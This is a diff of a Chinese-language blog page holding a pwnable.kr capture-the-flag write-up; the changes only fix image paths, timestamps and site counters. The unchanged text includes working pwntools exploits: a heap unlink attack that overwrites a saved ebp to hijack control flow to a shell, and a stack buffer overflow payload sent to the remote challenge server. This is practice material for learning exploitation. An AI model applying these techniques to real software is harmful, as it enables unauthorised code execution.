@@ -127,13 +127,13 @@
 <meta property="og:site_name" content="w4rd3n">
 <meta property="og:description" content="unlinkunlink函数可以任意写,程序unlink之后直接结束,只能覆盖返回地址 12345678void unlink(OBJ* P)&amp;#123;    OBJ* BK;    OBJ* FD;    BK=P-&amp;gt;bk;    FD=P-&amp;gt;fd;    FD-&amp;gt;bk=BK;    BK-&amp;gt;fd=FD;&amp;#125; main函数结尾汇编代码如下,可以更改ebp从而劫持">
 <meta property="og:locale" content="zh-CN">
-<meta property="og:image" content="https://hitworld.github.io/posts/undefined/1.png">
-<meta property="og:image" content="https://hitworld.github.io/posts/undefined/2.png">
-<meta property="og:updated_time" content="2020-07-09T03:19:40.645Z">
+<meta property="og:image" content="https://hitworld.github.io/posts/c692c40b/1.png">
+<meta property="og:image" content="https://hitworld.github.io/posts/c692c40b/2.png">
+<meta property="og:updated_time" content="2020-07-09T03:20:02.873Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="writeup-pwnable-kr">
 <meta name="twitter:description" content="unlinkunlink函数可以任意写,程序unlink之后直接结束,只能覆盖返回地址 12345678void unlink(OBJ* P)&amp;#123;    OBJ* BK;    OBJ* FD;    BK=P-&amp;gt;bk;    FD=P-&amp;gt;fd;    FD-&amp;gt;bk=BK;    BK-&amp;gt;fd=FD;&amp;#125; main函数结尾汇编代码如下,可以更改ebp从而劫持">
-<meta name="twitter:image" content="https://hitworld.github.io/posts/undefined/1.png">
+<meta name="twitter:image" content="https://hitworld.github.io/posts/c692c40b/1.png">
 
 
 
@@ -538,10 +538,10 @@
 <p><code>main</code>函数结尾汇编代码如下,可以更改<code>ebp</code>从而劫持<code>esp</code>到可控区域,<code>ret</code>到<code>shell</code></p>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">80485ff:    8b 4d <span class="built_in">fc</span>             mov    -0x4(%ebp),%ecx ;ecx = [ebp - 4]</span><br><span class="line">8048602:    c9                   leave                  ;mov esp, ebp;pop ebp</span><br><span class="line">8048603:    8d 61 <span class="built_in">fc</span>             lea    -0x4(%ecx),%esp ;esp = [ecx - 4]</span><br><span class="line">8048606:    c3                   ret;</span><br></pre></td></tr></table></figure>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">r = process(<span class="string">"./unlink"</span>)</span><br><span class="line"></span><br><span class="line">r.recvuntil(<span class="string">"leak: "</span>)</span><br><span class="line">stack = int(r.recvline(),<span class="number">16</span>)</span><br><span class="line">r.recvuntil(<span class="string">"leak: "</span>)</span><br><span class="line">heap = int(r.recvline(),<span class="number">16</span>)</span><br><span class="line"><span class="keyword">print</span> <span class="string">"stack: "</span> + hex(stack)</span><br><span class="line"><span class="keyword">print</span> <span class="string">"heap: "</span> + hex(heap)</span><br><span class="line"></span><br><span class="line">gdb.attach(r)</span><br><span class="line"></span><br><span class="line">payload = p32(<span class="number">0x80484eb</span>) + p32(heap + <span class="number">0xc</span>) + <span class="string">"a"</span> * <span class="number">8</span> + p32(stack - <span class="number">0x20</span>) + p32(heap + <span class="number">0x10</span>)</span><br><span class="line"><span class="comment">#FD = stack - 0x20;BK = heap + 0x10;heap + 0x10 = stack - 0x20;stack - 0x1c = heap + 0x10;</span></span><br><span class="line"><span class="comment">#stack - 0x1c即unlink被调用者保存的ebp,从而更改ebp</span></span><br><span class="line">r.sendline(payload)</span><br><span class="line"></span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure>
-<h2 id="fd"><a href="#fd" class="headerlink" title="fd"></a>fd</h2><img src="/posts/undefined/1.png" title="fd">
+<h2 id="fd"><a href="#fd" class="headerlink" title="fd"></a>fd</h2><img src="/posts/c692c40b/1.png" title="fd">
 <hr>
 <p>标准输入的<code>fd</code>为<code>0</code>,以<code>0x1234</code>(<code>4660</code>)为命令行参数即可</p>
-<h2 id="col"><a href="#col" class="headerlink" title="col"></a>col</h2><img src="/posts/undefined/2.png" title="col">
+<h2 id="col"><a href="#col" class="headerlink" title="col"></a>col</h2><img src="/posts/c692c40b/2.png" title="col">
 <hr>
 <h2 id="bof"><a href="#bof" class="headerlink" title="bof"></a>bof</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">r = remote(<span class="string">"pwnable.kr"</span>,<span class="string">"9000"</span>)</span><br><span class="line"></span><br><span class="line">payload = p32(<span class="number">0xcafebabe</span>) * <span class="number">0x10</span></span><br><span class="line"><span class="comment">#懒得看偏移了</span></span><br><span class="line">r.sendline(payload)</span><br><span class="line"></span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure>
 
@@ -666,7 +666,7 @@
                 
                   <a href="/archives/">
                 
-                    <span class="site-state-item-count">184</span>
+                    <span class="site-state-item-count">186</span>
                     <span class="site-state-item-name">日志</span>
                   </a>
                 </div>
@@ -928,7 +928,7 @@
       <i class="fa fa-area-chart"></i>
     </span>
     
-    <span title="站点总字数">697k</span>
+    <span title="站点总字数">699k</span>
   
 
   
@@ -937,7 +937,7 @@
       <i class="fa fa-coffee"></i>
     </span>
     
-    <span title="站点阅读时长">10:33</span>
+    <span title="站点阅读时长">10:36</span>
   
 </div>
 
